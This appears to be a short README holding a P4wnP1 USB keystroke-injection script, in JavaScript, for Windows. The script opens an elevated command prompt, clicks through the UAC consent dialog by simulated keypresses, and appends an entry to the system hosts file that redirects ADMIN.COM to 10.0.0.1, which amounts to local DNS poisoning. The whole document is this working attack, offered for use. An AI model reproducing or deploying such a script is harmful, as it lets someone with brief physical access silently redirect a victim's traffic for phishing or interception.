# LOCAL DNS POISONING
This script has been written in javascript adapted to P4wnP1 language in order to be ran in a Windows desktop environment

# Script
```js
layout('es')                    // Spanish keyboard layout
typingSpeed(100,150)    // Wait 100ms between key strokes + an additional random value between 0ms and 150ms (natural)

// Author:ernest and isaac
press("GUI r")
delay(100)
type("cmd.exe")
delay(100)
press("CONTROL SHIFT ENTER")
delay(100)
press("GUI TAB")
delay(100)
press("GUI TAB")
delay(100)
press("RIGHT_ARROW")
delay(100)
press("LEFT_ARROW")
delay(100)
press("ENTER")
delay(100)
type("ECHO. >> C:\WINDOWS\SYSTEM32\DRIVERS\ETC\HOSTS")
delay(100)
press("ENTER")
type("ECHO 10.0.0.1 ADMIN.COM >> C:\WINDOWS\SYSTEM32\DRIVERS\ETC\HOSTS")
delay(100)
press("ENTER")
delay(100)
type("exit")
delay(100)
press("ENTER")
```
